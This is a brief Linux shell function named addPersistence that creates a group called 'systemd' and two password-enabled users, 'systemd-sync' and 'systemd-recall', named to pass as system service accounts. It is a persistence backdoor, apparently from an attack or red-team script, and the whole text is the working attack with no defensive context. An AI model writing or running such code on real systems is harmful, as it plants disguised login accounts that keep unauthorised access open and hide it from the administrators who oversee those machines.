addPersistence() {
sudo groupadd systemd

sudo useradd -u 569 -g systemd -M systemd-sync
sudo useradd -u 570 -g systemd -M systemd-recall

sudo passwd systemd-sync
sudo passwd systemd-recall

}
